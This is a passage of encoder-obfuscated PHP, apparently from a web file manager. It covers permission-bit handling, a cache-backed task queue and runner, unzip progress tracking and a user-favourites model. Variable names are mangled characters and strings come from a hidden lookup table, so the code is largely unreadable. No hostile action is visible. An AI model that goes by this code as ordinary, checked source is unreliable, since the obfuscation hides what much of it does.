$this->findAuth($ò¯³°åŒ, $ÉªµóÈ’); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Íü§æ =& $_SERVER[‹‰”››ê]; $Œ’â¾ğº = parent::listData(); $ø Ï­…ı = !1; foreach ($Œ’â¾ğº as $æşØöà) { if ($æşØöà[$Íü§æ[499]] <= 0 || $æşØöà[$Íü§æ[2014]] == $Íü§æ[231]) { continue; } if (!$ø Ï­…ı) { $ø Ï­…ı = $æşØöà; continue; } if ($ø Ï­…ı[$Íü§æ[499]] > $æşØöà[$Íü§æ[499]]) { $ø Ï­…ı = $æşØöà; } } return $ø Ï­…ı ? $ø Ï­…ı[$Íü§æ[487]] : $Íü§æ[12]; } public function listData($á¥ÃüÖå = false, $Ü»ˆ–— = "\163\157\162\164", $›„Æ´Öø = false) { return parent::listData($á¥ÃüÖå, $Ü»ˆ–—, $›„Æ´Öø); } public function update($·ÒÀ©· , $òÏÌ•úÚ) { $¹üøˆÄ =& $_SERVER[‹‰”››ê]; $ËæıÇŞ› = parent::listData($·ÒÀ©· ); $üƒå‡ñ½ = $this->findByName($òÏÌ•úÚ[$¹üøˆÄ[32]]); if (!$ËæıÇŞ› || $üƒå‡ñ½ && $üƒå‡ñ½[$¹üøˆÄ[487]] != $ËæıÇŞ›[$¹üøˆÄ[487]]) { return !1; } $this->filterAuth($òÏÌ•úÚ[$¹üøˆÄ[499]]); return parent::update($·ÒÀ©· , $òÏÌ•úÚ); } public function remove($¾™æüÌû) { $ì¨õÌÊ = parent::listData($¾™æüÌû); if (!$ì¨õÌÊ || $ì¨õÌÊ[$_SERVER[‹‰”››ê][192]]) { return !1; } return parent::remove($¾™æüÌû); } public function add($®Ë¦¶µ‰ = array()) { $²î¡¡¯” =& $_SERVER[‹‰”››ê]; if ($this->findByName($®Ë¦¶µ‰[$²î¡¡¯”[32]])) { return !1; } $ŠğÈ…„  = array($²î¡¡¯”[32] => $²î¡¡¯”[12], $²î¡¡¯”[499] => 1, $²î¡¡¯”[2015] => $²î¡¡¯”[2002], $²î¡¡¯”[2014] => 1, $²î¡¡¯”[192] => 0, $²î¡¡¯”[2016] => 0); $®Ë¦¶µ‰ = array_merge($ŠğÈ…„ , $®Ë¦¶µ‰); $®Ë¦¶µ‰[$²î¡¡¯”[2016]] = $this->getSort(); $this->filterAuth($®Ë¦¶µ‰[$²î¡¡¯”[499]]); return parent::insert($®Ë¦¶µ‰); } private function getSort() { $Ú«Œœ¤³ =& $_SERVER[‹‰”››ê]; $ªæˆ‰Ø² = parent::listData(); $‚ÄÏ©Ê½ = array_to_keyvalue($ªæˆ‰Ø², $Ú«Œœ¤³[12], $Ú«Œœ¤³[2016]); return empty($‚ÄÏ©Ê½) ? 0 : max($‚ÄÏ©Ê½) + 1; } private function filterAuth(&$ŠŸíôé“) { if (!$ŠŸíôé“) { return; } $Õ“ßî› = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $êØãÚğ¯ = array(); foreach ($Õ“ßî› as $ÃÑˆ•”) { if ($ŠŸíôé“ & $ÃÑˆ•”) { $êØãÚğ¯[] = $ÃÑˆ•”; } } if (in_array(self::AUTH_ROOT, $êØãÚğ¯)) { $ŠŸíôé“ = array_sum($Õ“ßî›); return; } $âÓ–È‡ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($êØãÚğ¯ as $ÃÑˆ•”) { if (isset($âÓ–È‡[$ÃÑˆ•”])) { $êØãÚğ¯ = array_merge($êØãÚğ¯, $âÓ–È‡[$ÃÑˆ•”]); } } $êØãÚğ¯[] = self::AUTH_SHOW; $ŠŸíôé“ = array_sum(array_unique($êØãÚğ¯)); } public function sort($ïˆ™æÁ, $ÜÈŸı¿) { return parent::update($ïˆ™æÁ, $ÜÈŸı¿); } } goto B´ÊæŠ´¾ó; e¸×£´µ—: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\153\x51\165\145\165\145\114\145\x6e\x67\164\150"; const QUEUE_DATA = "\164\x61\163\153\121\165\145\x75\x65\104\141\164\141"; const QUEUE_TIME = "\x74\x61\x73\153\x51\165\x65\x75\x65\114\x61\x73\164\122\x75\156"; const QUEUE_THREAD = "\x74\x61\x73\x6b\x51\165\x65\x75\x65\124\150\162\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ØàµóÀŒ, $•‡†à = array(), $µïØì“ = '', $¥„ÎÂôË = '') { $€£¸çáº =& $_SERVER[‹‰”››ê]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¥„ÎÂôË && array_find_by_field(self::$listData, $€£¸çáº[97], $¥„ÎÂôË)) { return !0; } if ($¥„ÎÂôË && array_find_by_field(self::$listDataAdd, $€£¸çáº[97], $¥„ÎÂôË)) { return !0; } self::$listDataAdd[] = array($€£¸çáº[353] => $ØàµóÀŒ, $€£¸çáº[1891] => $•‡†à, $€£¸çáº[538] => $µïØì“, $€£¸çáº[97] => $¥„ÎÂôË); return !0; } public static function addSubmit() { $¿‘ğÔ¦ =& $_SERVER[‹‰”››ê]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¿‘ğÔ¦[1892] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¿‘ğÔ¦[12], $¿‘ğÔ¦[538])), $¿‘ğÔ¦[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Ä˜ÖÄÑö, $ÁéÒ©¤ = array(), $ñ³œ­³õ = '', $¿üş¬´† = '') { $õ‰´¦ÉÛ =& $_SERVER[‹‰”››ê]; if (self::count() >= self::MAX_LENGTH) { return !1; } $õ˜±ë‹ù = self::getAll(); if ($¿üş¬´† && array_find_by_field($õ˜±ë‹ù, $õ‰´¦ÉÛ[97], $¿üş¬´†)) { return !0; } $õ˜±ë‹ù[] = array($õ‰´¦ÉÛ[353] => $Ä˜ÖÄÑö, $õ‰´¦ÉÛ[1891] => $ÁéÒ©¤, $õ‰´¦ÉÛ[538] => $ñ³œ­³õ, $õ‰´¦ÉÛ[97] => $¿üş¬´†); self::setAll($õ˜±ë‹ù); write_log($õ‰´¦ÉÛ[1892] . $ñ³œ­³õ, $õ‰´¦ÉÛ[198]); return !0; } public static function run() { $¦´Ã¥¯€ =& $_SERVER[‹‰”››ê]; $à±’–ş­ = self::getAll(); $ô”Õ¬ = array_shift($à±’–ş­); if (!$ô”Õ¬) { return !1; } self::setAll($à±’–ş­); $“Ÿº“ÁÃ = timeFloat(); $ë°Ÿ…€ì = $¦´Ã¥¯€[12]; try { $ë°Ÿ…€ì = Hook::apply($ô”Õ¬[$¦´Ã¥¯€[353]], $ô”Õ¬[$¦´Ã¥¯€[1891]]); } catch (Exception $†Ôçè´Ó) { write_log($†Ôçè´Ó, $¦´Ã¥¯€[1280]); } $…÷»ÕŸÓ = number_format(timeFloat() - $“Ÿº“ÁÃ, 3) . $¦´Ã¥¯€[1807]; if ($ë°Ÿ…€ì && is_string($ë°Ÿ…€ì)) { $…÷»ÕŸÓ = $…÷»ÕŸÓ . $¦´Ã¥¯€[1893] . $ë°Ÿ…€ì; } write_log($¦´Ã¥¯€[1894] . $ô”Õ¬[$¦´Ã¥¯€[538]] . $¦´Ã¥¯€[1895] . $…÷»ÕŸÓ, $¦´Ã¥¯€[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $®”¶´¤á =& $_SERVER[‹‰”››ê]; $–Ÿ“ù¬º = self::threadCount() + 1; if ($–Ÿ“ù¬º > 3 || !self::count()) { return; } write_log($®”¶´¤á[1896] . $–Ÿ“ù¬º, $®”¶´¤á[198]); Cache::set(self::QUEUE_THREAD, $–Ÿ“ù¬º, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($®”¶´¤á[1897], $®”¶´¤á[198]); } public static function getKey($ìíÏĞØì, $ìûÕˆŠä = "\x69\x6e\164") { $ÂÌì˜ï€ =& $_SERVER[‹‰”››ê]; Cache::removeMemory($ìíÏĞØì); $Â•´µÊ… = Cache::get($ìíÏĞØì); if ($ìûÕˆŠä == $ÂÌì˜ï€[375]) { return $Â•´µÊ… ? intval($Â•´µÊ…) : 0; } if ($ìûÕˆŠä == $ÂÌì˜ï€[1898]) { return is_array($Â•´µÊ…) ? $Â•´µÊ… : array(); } return $Â•´µÊ…; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[‹‰”››ê][1898]); } public static function setAll($îÃœıĞÛ) { $„ğ±•ì = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($îÃœıĞÛ), $„ğ±•ì); Cache::set(self::QUEUE_DATA, $îÃœıĞÛ, $„ğ±•ì); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($­¯‚àÃ, $åè°Œ‘ = 5.0) { if (!$­¯‚àÃ) { return; } $ã×ºÈŠ° = Cache::get($­¯‚àÃ); if (!$ã×ºÈŠ° || timeFloat() - floatVal($ã×ºÈŠ°) >= $åè°Œ‘) { Cache::set($­¯‚àÃ, timeFloat(), $åè°Œ‘ * 10); return !0; } return !1; } public static function timeLimitCall($†¼Œ­÷, $ô”‚õùç, $¥ôªìş’, $Î›ıÎ× = 5.0) { $…Û•Ç§‚ =& $_SERVER[‹‰”››ê]; if (!$†¼Œ­÷ || !$ô”‚õùç) { return; } self::$asyncAdd = !0; $ÍÅŞç†÷ = $…Û•Ç§‚[1899]; $‚ñÂíñÃ = Cache::get($ÍÅŞç†÷, !0); $ªÓÍäÃº = array($…Û•Ç§‚[1900] => timeFloat(), $…Û•Ç§‚[1901] => timeFloat(), $…Û•Ç§‚[353] => $ô”‚õùç, $…Û•Ç§‚[1891] => $¥ôªìş’, $…Û•Ç§‚[207] => $Î›ıÎ×); if (is_array($‚ñÂíñÃ[$†¼Œ­÷])) { $ªÓÍäÃº[$…Û•Ç§‚[1901]] = $‚ñÂíñÃ[$†¼Œ­÷][$…Û•Ç§‚[1901]]; } if (is_array($‚ñÂíñÃ[$†¼Œ­÷])) { if (timeFloat() - $‚ñÂíñÃ[$†¼Œ­÷][$…Û•Ç§‚[1900]] < $ªÓÍäÃº[$…Û•Ç§‚[207]] * 0.3) { return; } $ªÓÍäÃº[$…Û•Ç§‚[1901]] = $‚ñÂíñÃ[$†¼Œ­÷][$…Û•Ç§‚[1901]]; } $‚ñÂíñÃ[$†¼Œ­÷] = $ªÓÍäÃº; Cache::set($ÍÅŞç†÷, $‚ñÂíñÃ, 60); Cache::removeMemory($ÍÅŞç†÷); write_log($…Û•Ç§‚[1902] . $†¼Œ­÷ . $…Û•Ç§‚[74] . $ô”‚õùç, $…Û•Ç§‚[198]); } public static function timeLimitCallLoop() { $İÄ‰ãèô =& $_SERVER[‹‰”››ê]; $úşí—¿Ë = array($İÄ‰ãèô[1903]); $¯’¾¢¦Ù = in_array(strtolower(ACTION), $úşí—¿Ë); if (!$¯’¾¢¦Ù && !self::$asyncAdd) { return; } $¹¬Ù–×± = $İÄ‰ãèô[1899]; $Ì²óÜé = Cache::get($¹¬Ù–×±, !0); if (!$Ì²óÜé || count($Ì²óÜé) <= 0) { return; } $¼™…ˆº– = !1; $¬Øè‹ = timeFloat(); $“æÅÒÌ = array(); foreach ($Ì²óÜé as $üŒ‰¼ÄÜ => $ÛÚª‹®¥) { if ($¬Øè‹ - $ÛÚª‹®¥[$İÄ‰ãèô[1901]] > $ÛÚª‹®¥[$İÄ‰ãèô[207]]) { $¼™…ˆº– = !0; try { Hook::apply($ÛÚª‹®¥[$İÄ‰ãèô[353]], $ÛÚª‹®¥[$İÄ‰ãèô[1891]]); write_log($İÄ‰ãèô[1904] . $üŒ‰¼ÄÜ . $İÄ‰ãèô[74] . $ÛÚª‹®¥[$İÄ‰ãèô[353]] . $İÄ‰ãèô[1905] . ACTION, $İÄ‰ãèô[198]); } catch (Exception $ú¬ÇªµÕ) { } continue; } $“æÅÒÌ[$üŒ‰¼ÄÜ] = $ÛÚª‹®¥; } if (!$¼™…ˆº–) { return; } if (!$“æÅÒÌ) { return Cache::remove($¹¬Ù–×±); } Cache::set($¹¬Ù–×±, $“æÅÒÌ, 60); Cache::removeMemory($¹¬Ù–×±); } public static function finished($À¸»Æ¤Ü, $ºı±çıÃ) { $°›ì¹›¢ =& $_SERVER[‹‰”››ê]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($°›ì¹›¢[353] => $À¸»Æ¤Ü, $°›ì¹›¢[1891] => $ºı±çıÃ); } private static function finishedRun() { $èÀÙ¹û£ =& $_SERVER[‹‰”››ê]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ İ§¢Â) { try { Hook::apply($ İ§¢Â[$èÀÙ¹û£[353]], $ İ§¢Â[$èÀÙ¹û£[1891]]); } catch (Exception $ìºš›Ï«) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $É‹°Ùô÷ =& $_SERVER[‹‰”››ê]; parent::startAfter(); Hook::bind($É‹°Ùô÷[1906], array($this, $É‹°Ùô÷[1907])); Hook::bind($É‹°Ùô÷[1294], array($this, $É‹°Ùô÷[1908])); Hook::bind($É‹°Ùô÷[1909], array($this, $É‹°Ùô÷[1910])); $³…»ãû¾ =& $this->task; $³…»ãû¾[$É‹°Ùô÷[1911]] = $É‹°Ùô÷[1295]; if (!$³…»ãû¾[$É‹°Ùô÷[1677]]) { $³…»ãû¾[$É‹°Ùô÷[1677]] = LNG($É‹°Ùô÷[1912]); } } protected function endAfter() { $¨×³Û×Ú =& $_SERVER[‹‰”››ê]; parent::endAfter(); Hook::unbind($¨×³Û×Ú[1906], array($this, $¨×³Û×Ú[1907])); Hook::unbind($¨×³Û×Ú[1294], array($this, $¨×³Û×Ú[1908])); Hook::unbind($¨×³Û×Ú[1909], array($this, $¨×³Û×Ú[1910])); } public function updateAfter() { $ÏÀöêÙô =& $_SERVER[‹‰”››ê]; $­ŒÕñÈ =& $this->task; if (!$­ŒÕñÈ[$ÏÀöêÙô[1156]] || !$­ŒÕñÈ[$ÏÀöêÙô[853]]) { if ($­ŒÕñÈ[$ÏÀöêÙô[1911]] != $ÏÀöêÙô[400]) { return; } } if ($­ŒÕñÈ[$ÏÀöêÙô[1911]] == $ÏÀöêÙô[1295]) { $´îô’ÑĞ = 0; if ($­ŒÕñÈ[$ÏÀöêÙô[1845]]) { $´îô’ÑĞ = $­ŒÕñÈ[$ÏÀöêÙô[1846]] / $­ŒÕñÈ[$ÏÀöêÙô[1845]]; } $­ŒÕñÈ[$ÏÀöêÙô[1793]] = $´îô’ÑĞ * 0.3; } else { if ($­ŒÕñÈ[$ÏÀöêÙô[1911]] == $ÏÀöêÙô[400]) { $´îô’ÑĞ = $­ŒÕñÈ[$ÏÀöêÙô[1792]] / $­ŒÕñÈ[$ÏÀöêÙô[1156]]; $­ŒÕñÈ[$ÏÀöêÙô[1793]] = 0.3 + $´îô’ÑĞ * 0.4; } else { if ($­ŒÕñÈ[$ÏÀöêÙô[1911]] == $ÏÀöêÙô[110]) { $ƒ’ÛÈ’× = 0; if ($­ŒÕñÈ[$ÏÀöêÙô[1847]] == $ÏÀöêÙô[110]) { $ƒ’ÛÈ’× = $­ŒÕñÈ[$ÏÀöêÙô[1846]]; } $´îô’ÑĞ = ($­ŒÕñÈ[$ÏÀöêÙô[1850]] + $ƒ’ÛÈ’×) / $­ŒÕñÈ[$ÏÀöêÙô[853]]; $­ŒÕñÈ[$ÏÀöêÙô[1793]] = 0.3 + 0.4 + $´îô’ÑĞ * 0.3; } } } if ($­ŒÕñÈ[$ÏÀöêÙô[1793]] > 0) { $ê„ÕŸ² = timeFloat() - $­ŒÕñÈ[$ÏÀöêÙô[1795]] - $­ŒÕñÈ[$ÏÀöêÙô[1798]]; $­ŒÕñÈ[$ÏÀöêÙô[1799]] = $ê„ÕŸ² * (1 - $­ŒÕñÈ[$ÏÀöêÙô[1793]]) / $­ŒÕñÈ[$ÏÀöêÙô[1793]]; } } public function addFile($“†£ÈÀ³) { $¼§ÇƒñØ =& $_SERVER[‹‰”››ê]; $¬èÖ™º• =& $this->task; $àŒ­¿ß† = IO::info($“†£ÈÀ³); $¬èÖ™º•[$¼§ÇƒñØ[1843]] = $àŒ­¿ß†[$¼§ÇƒñØ[32]]; $¬èÖ™º•[$¼§ÇƒñØ[1845]] = $àŒ­¿ß†[$¼§ÇƒñØ[79]]; $¬èÖ™º•[$¼§ÇƒñØ[1846]] = 0; $¬èÖ™º•[$¼§ÇƒñØ[1158]] = $¼§ÇƒñØ[1866]; $¬èÖ™º•[$¼§ÇƒñØ[1847]] = $¼§ÇƒñØ[1295]; $¬èÖ™º•[$¼§ÇƒñØ[853]] = $àŒ­¿ß†[$¼§ÇƒñØ[79]]; $¬èÖ™º•[$¼§ÇƒñØ[1156]] = 1; $Ø¸Ü÷‹ = 0; $¬èÖ™º•[$¼§ÇƒñØ[1854]] = array($¼§ÇƒñØ[1855] => $Ø¸Ü÷‹ + 1, $¼§ÇƒñØ[506] => $àŒ­¿ß†[$¼§ÇƒñØ[32]], $¼§ÇƒñØ[87] => $àŒ­¿ß†[$¼§ÇƒñØ[87]], $¼§ÇƒñØ[596] => $àŒ­¿ß†[$¼§ÇƒñØ[596]] ? $àŒ­¿ß†[$¼§ÇƒñØ[596]] : $àŒ­¿ß†[$¼§ÇƒñØ[87]]); $this->update(); } public function zipEvent($«ÅËÃøŸ, $Â×©Õ°´, $ğ¢Å˜ƒƒ, $©›â°‹) { $ÑØÏ “ù =& $_SERVER[‹‰”››ê]; $Íııœü‡ =& $this->task; $Íııœü‡[$ÑØÏ “ù[1843]] = get_path_this($Â×©Õ°´); $Íııœü‡[$ÑØÏ “ù[1845]] = $©›â°‹; $Íııœü‡[$ÑØÏ “ù[1846]] = $ğ¢Å˜ƒƒ; $Íııœü‡[$ÑØÏ “ù[1158]] = $«ÅËÃøŸ == $ÑØÏ “ù[1913] ? $ÑØÏ “ù[1914] : $ÑØÏ “ù[1915]; $Íııœü‡[$ÑØÏ “ù[1847]] = $ÑØÏ “ù[12]; $Íııœü‡[$ÑØÏ “ù[853]] = $©›â°‹; $Íııœü‡[$ÑØÏ “ù[1911]] = $ÑØÏ “ù[400]; $this->update(); } public function unzipAfter($æÑˆ»†) { $ªÂ›Ç“ğ =& $_SERVER[‹‰”››ê]; $‡ÍáßÓî =& $this->task; $‡ÍáßÓî[$ªÂ›Ç“ğ[1911]] = $ªÂ›Ç“ğ[110]; $ £¸íò = IO::infoWithChildren($æÑˆ»†); $ØĞ–¼Ñì = 0; $‡ÍáßÓî[$ªÂ›Ç“ğ[1854]] = array($ªÂ›Ç“ğ[1855] => $ØĞ–¼Ñì + 1, $ªÂ›Ç“ğ[506] => $ £¸íò[$ªÂ›Ç“ğ[32]], $ªÂ›Ç“ğ[87] => $ £¸íò[$ªÂ›Ç“ğ[87]], $ªÂ›Ç“ğ[596] => $ £¸íò[$ªÂ›Ç“ğ[596]] ? $ £¸íò[$ªÂ›Ç“ğ[596]] : $ £¸íò[$ªÂ›Ç“ğ[87]]); if ($ £¸íò[$ªÂ›Ç“ğ[33]] == $ªÂ›Ç“ğ[233]) { $‡ÍáßÓî[$ªÂ›Ç“ğ[1156]] = 1; } else { $‡ÍáßÓî[$ªÂ›Ç“ğ[1156]] = $ £¸íò[$ªÂ›Ç“ğ[82]][$ªÂ›Ç“ğ[80]]; } $‡ÍáßÓî[$ªÂ›Ç“ğ[1158]] = $ªÂ›Ç“ğ[12]; $‡ÍáßÓî[$ªÂ›Ç“ğ[1847]] = 0; $‡ÍáßÓî[$ªÂ›Ç“ğ[1792]] = 0; $‡ÍáßÓî[$ªÂ›Ç“ğ[1845]] = 0; $‡ÍáßÓî[$ªÂ›Ç“ğ[1846]] = 0; $‡ÍáßÓî[$ªÂ›Ç“ğ[1843]] = $ªÂ›Ç“ğ[12]; $‡ÍáßÓî[$ªÂ›Ç“ğ[1850]] = 0; $‡ÍáßÓî[$ªÂ›Ç“ğ[853]] = $ £¸íò[$ªÂ›Ç“ğ[79]]; $this->update(); self::log($ªÂ›Ç“ğ[1916] . json_encode(array($‡ÍáßÓî, $ £¸íò))); } public function nameParse($£¨³Ûİ») { $øÇäª— =& $_SERVER[‹‰”››ê]; $öÃŒşşÛ =& $this->task; if ($öÃŒşşÛ[$øÇäª—[1911]] == $øÇäª—[1295]) { $öÃŒşşÛ[$øÇäª—[1911]] = $øÇäª—[400]; $öÃŒşşÛ[$øÇäª—[1850]] = 0; $öÃŒşşÛ[$øÇäª—[853]] = 0; } $•©«¾Î½ = get_path_this($£¨³Ûİ»); if (strstr($•©«¾Î½, $øÇäª—[10])) { $öÃŒşşÛ[$øÇäª—[1792]] += 1; $öÃŒşşÛ[$øÇäª—[1156]] += 1; } $öÃŒşşÛ[$øÇäª—[1843]] = $£¨³Ûİ»; $this->update(); } } goto AÓ¬°§Ó–Å; d¨¥­íÕ™Ù: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($º†«ƒÇ’) { $ü’¶´Ãë =& $_SERVER[‹‰”››ê]; return array($ü’¶´Ãë[2107] => array(USER_ID, $ü’¶´Ãë[2486])); } protected function listData() { $¥·ÏÒîŞ =& $_SERVER[‹‰”››ê]; $–¡§ÅË¼ = array($¥·ÏÒîŞ[1782] => USER_ID, $¥·ÏÒîŞ[571] => 0); $•şñ¯“§ = $¥·ÏÒîŞ[2487]; $¾”ŸŞŸ÷ = $this->field($•şñ¯“§)->where($–¡§ÅË¼)->order($¥·ÏÒîŞ[2488])->select(); return $¾”ŸŞŸ÷ ? $¾”ŸŞŸ÷ : array(); } protected function resetCache() { } protected function listView() { $†¢ä¢ÏŞ =& $_SERVER[‹‰”››ê]; $©è»Ôâ‰ = $this->listData(); $£ÎÅÑ¤À = array_filter_by_field($©è»Ôâ‰, $†¢ä¢ÏŞ[33], $†¢ä¢ÏŞ[502]); $ŒóÊƒè¦ = array_to_keyvalue($£ÎÅÑ¤À, $†¢ä¢ÏŞ[12], $†¢ä¢ÏŞ[87]); if (!$ŒóÊƒè¦) { return $©è»Ôâ‰; } $Ë¸÷¿æ = 2000; $…Ÿ‘–ÌÆ = array($†¢ä¢ÏŞ[503] => array($†¢ä¢ÏŞ[504], $ŒóÊƒè¦)); $òË´Ìâ¢ = Model($†¢ä¢ÏŞ[920])->listSource($…Ÿ‘–ÌÆ, $Ë¸÷¿æ); $òË´Ìâ¢ = array_merge($òË´Ìâ¢[$†¢ä¢ÏŞ[86]], $òË´Ìâ¢[$†¢ä¢ÏŞ[85]]); $òË´Ìâ¢ = array_to_keyvalue($òË´Ìâ¢, $†¢ä¢ÏŞ[194]); foreach ($©è»Ôâ‰ as $¦šÄ¼é => $ÁôÏŸª) { $“ôÂâäè = $òË´Ìâ¢[$ÁôÏŸª[$†¢ä¢ÏŞ[87]]]; $“ôÂâäè = $“ôÂâäè ? $“ôÂâäè : array(); $©è»Ôâ‰[$¦šÄ¼é] = array_merge($“ôÂâäè, $ÁôÏŸª); } return $©è»Ôâ‰; } protected function addFav($©‡ã½Ôö, $ñóœìĞÊ = '', $ûé‘š¡ = "\x73\x6f\x75\x72\x63\x65") { $‚ÛŠÃûÆ =& $_SERVER[‹‰”››ê]; $Ê­äö¢É = array($‚ÛŠÃûÆ[1782] => USER_ID, $‚ÛŠÃûÆ[571] => 0, $‚ÛŠÃûÆ[508] => $ûé‘š¡, $‚ÛŠÃûÆ[507] => $©‡ã½Ôö); if ($this->where($Ê­äö¢É)->find()) { return !1; } $Ê­äö¢É = array($‚ÛŠÃûÆ[1782] => USER_ID, $‚ÛŠÃûÆ[571] => 0); $¡è¤î¸ = $this->where($Ê­äö¢É)->max($‚ÛŠÃûÆ[2016]); if (!$¡è¤î¸) { $¡è¤î¸ = 0; } if (!$ñóœìĞÊ && $ûé‘š¡ == $‚ÛŠÃûÆ[502]) { $…Í¥Š¼Ç = Model($‚ÛŠÃûÆ[1437])->where(array($‚ÛŠÃûÆ[503] => $©‡ã½Ôö))->find(); if (!$…Í¥Š¼Ç) { return !1; } $ñóœìĞÊ = $…Í¥Š¼Ç[$‚ÛŠÃûÆ[32]]; } $ñóœìĞÊ = $this->getAutoName($ñóœìĞÊ); $Íıœ¹ö· = array($‚ÛŠÃûÆ[1782] => USER_ID, $‚ÛŠÃûÆ[571] => 0, $‚ÛŠÃûÆ[506] => $ñóœìĞÊ, $‚ÛŠÃûÆ[507] => $©‡ã½Ôö, $‚ÛŠÃûÆ[508] => $ûé‘š¡, $‚ÛŠÃûÆ[1996] => $¡è¤î¸ + 1); return $this->add($Íıœ¹ö·); } protected function remove($ñ™–Æ) { $ÑŒ•Õ½µ =& $_SERVER[‹‰”››ê]; $Ù„ÄĞÏô = array($ÑŒ•Õ½µ[1782] => USER_ID, $ÑŒ•Õ½µ[505] => $ñ™–Æ); return $this->where($Ù„ÄĞÏô)->delete(); } protected function removeByName($®˜ò†‚—) { $¼ÖĞÁº» =& $_SERVER[‹‰”››ê]; $ôÆŸ¹¯÷ = array($¼ÖĞÁº»[1782] => USER_ID, $¼ÖĞÁº»[506] => $®˜ò†‚—, $¼ÖĞÁº»[571] => 0); return $this->where($ôÆŸ¹¯÷)->delete(); } protected function rename($µ­í¦—Í, $ğÅŠ€†Ş) { $²ß·®¾ó =& $_SERVER[‹‰”››ê]; if ($µ­í¦—Í == $ğÅŠ€†Ş) { return !1; } $Øß¸Á¾˜ = $this->getAutoName($ğÅŠ€†Ş); if ($ğÅŠ€†Ş != $Øß¸Á¾˜) { return !1; } $¤½Í´œ = array($²ß·®¾ó[1782] => USER_ID, $²ß·®¾ó[571] => 0, $²ß·®¾ó[32] => $µ­í¦—Í); return $this->where($¤½Í´œ)->save(array($²ß·®¾ó[32] => $ğÅŠ€†Ş)); } protected function resetSort($ñÖ´úáÓ) { $•¡¸“Éæ =& $_SERVER[‹‰”››ê]; $ñÖ´úáÓ = is_array($ñÖ´úáÓ) ? $ñÖ´úáÓ : array(); $Ö ößï´ = array($•¡¸“Éæ[1782] => USER_ID); for ($ïè«ªÍ = 0; $ïè«ªÍ < count($ñÖ´úáÓ); $ïè«ªÍ++) { $Ö ößï´[$•¡¸“Éæ[505]] = $ñÖ´úáÓ[$ïè«ªÍ]; $this->where($Ö ößï´)->save(array($•¡¸“Éæ[1996] => $ïè«ªÍ + 1)); } return !0; } protected function moveTop($Û¯öß×) { $ÔÏÛµÃ =& $_SERVER[‹‰”››ê]; $³©šÉ‚Å = array($ÔÏÛµÃ[1782] => USER_ID, $ÔÏÛµÃ[571] => 0); $†ÊØªÊØ = $this->where($³©šÉ‚Å)->where(array($ÔÏÛµÃ[32] => $Û¯öß×))->find(); if (!$†ÊØªÊØ) { return; } $¡Ï‡‰’ = $this->field($ÔÏÛµÃ[487])->where($³©šÉ‚Å)->order($ÔÏÛµÃ[2488])->select(); $¡Ï‡‰’ = array_to_keyvalue($¡Ï‡‰’, $ÔÏÛµÃ[12], $ÔÏÛµÃ[487]); $½¤µüí• = $¡Ï‡‰’; $¡Ï‡‰’ = array_remove_value($¡Ï‡‰’, $†ÊØªÊØ[$ÔÏÛµÃ[487]]); array_unshift($¡Ï‡‰’, $†ÊØªÊØ[$ÔÏÛµÃ[487]]); return $this->resetSort($¡Ï‡‰’); } protected function moveBottom($ £ÚŸ¨±) { $Ù¬¦ÑìÍ =& $_SERVER[‹‰”››ê]; $ëÑƒ†ä’ = array($Ù¬¦ÑìÍ[1782] => USER_ID, $Ù¬¦ÑìÍ[571] => 0); $ùÂ‘Ê§Ø = $this->where($ëÑƒ†ä’)->max($Ù¬¦ÑìÍ[2016]); $¥­È‹ó = array($Ù¬¦ÑìÍ[2016] => $ùÂ‘Ê§Ø + 1); return $this->where($ëÑƒ†ä’)->where(array($Ù¬¦ÑìÍ[32] => $ £ÚŸ¨±))->save($¥­È‹ó); } private function getAutoName($ç””•àõ) { $Ãí¸¶Şµ =& $_SERVER[‹‰”››ê]; $ËÒçèÉ = array($Ãí¸¶Şµ[1782] => USER_ID, $Ãí¸¶Şµ[571] => 0); $Œ“ÉŞª = $this->field($Ãí¸¶Şµ[32])->where($ËÒçèÉ)->select(); $Œ“ÉŞª = array_to_keyvalue($Œ“ÉŞª, $Ãí¸¶Şµ[12], $Ãí¸¶Şµ[32]); if (!$Œ“ÉŞª || !in_array($ç””•àõ, $Œ“ÉŞª)) { return $ç””•àõ; } for ($¹©¨ÉçÎ = 0; $¹©¨ÉçÎ < count($Œ“ÉŞª); $¹©¨ÉçÎ++) { if (!in_array($ç””•àõ . 